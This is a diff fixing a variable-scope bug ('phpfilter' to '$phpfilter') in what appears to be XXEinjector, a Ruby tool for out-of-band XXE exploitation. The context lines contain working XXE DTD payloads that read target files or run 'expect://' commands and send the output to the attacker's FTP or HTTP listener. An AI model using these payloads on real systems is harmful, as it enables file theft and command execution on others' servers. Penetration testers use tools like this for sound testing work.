@@ -22,7 +22,7 @@ $proxy = "" # proxy host
 $proxy_port = "" # proxy port
 
 enumports = "" # which ports should be checked if they are unfiltered for reverse connections
-phpfilter = "n" # if yes php filter will be used to base64 encode file content - y/n
+$phpfilter = "n" # if yes php filter will be used to base64 encode file content - y/n
 $urlencode = "n" # if injected DTD should be URL encoded
 enumall = "n" # if yes XXEinjector will not ask what to enum (prone to false positives) - y/n
 $brute = "" # file with paths to bruteforce
@@ -81,7 +81,7 @@ ARGV.each do |arg|
 	$proto = "https" if arg.include?("--ssl")
 	$proxy = arg.split("=")[1].split(":")[0] if arg.include?("--proxy=")
 	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
-	phpfilter = "y" if arg.include?("--phpfilter")
+	$phpfilter = "y" if arg.include?("--phpfilter")
 	enumall = "y" if arg.include?("--fast")
 	$brute = arg.split("=")[1] if arg.include?("--brute=")
 	$verbose = "y" if arg.include?("--verbose")
@@ -793,7 +793,7 @@ loop do
 				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 			elsif expect != ""
 				if enum == "ftp"
-					if phpfilter == "n"
+					if $phpfilter == "n"
 						payload = "<!ENTITY % payl SYSTEM \"expect://#{expect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
 						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 					else
@@ -801,7 +801,7 @@ loop do
 						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 					end
 				elsif enum == "http"
-					if phpfilter == "n"
+					if $phpfilter == "n"
 						payload = "<!ENTITY % payl SYSTEM \"expect://#{expect}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
 						client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 					else
@@ -810,7 +810,7 @@ loop do
 					end
 				end
 			elsif enum == "ftp" && expect == ""
-				if phpfilter == "n"
+				if $phpfilter == "n"
 					payload = "<!ENTITY % payl SYSTEM \"#{$rproto}:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'ftp://#{host}:#{ftp_port}/%payl;'>\">"
 					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 				else
@@ -818,7 +818,7 @@ loop do
 					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 				end
 			elsif enum == "http" && expect == ""
-				if phpfilter == "n"
+				if $phpfilter == "n"
 					payload = "<!ENTITY % payl SYSTEM \"#{$rproto}:///#{enumpath}\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://#{host}:#{http_port}/?p=%payl;'>\">"
 					client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 				else
@@ -844,7 +844,7 @@ loop do
 			client.print("HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\nThanks")
 
 			# base64 decode if parameter was encoded
-			if phpfilter == "y"
+			if $phpfilter == "y"
 				req = Base64.decode64(req)
 			end
 
@@ -856,7 +856,7 @@ loop do
 
 			# set proper splitter
 			splitter = "%0A"
-			splitter = "\n" if phpfilter == "y"
+			splitter = "\n" if $phpfilter == "y"
 
 			puts "[+] Retrieved data:"
 			req.split(splitter).each do |param|
@@ -914,7 +914,7 @@ if enum == "ftp"
 					req += "\n"
 				end
 	
-				if phpfilter == "y"
+				if $phpfilter == "y"
 					req = Base64.decode64(req)
 				end
 	
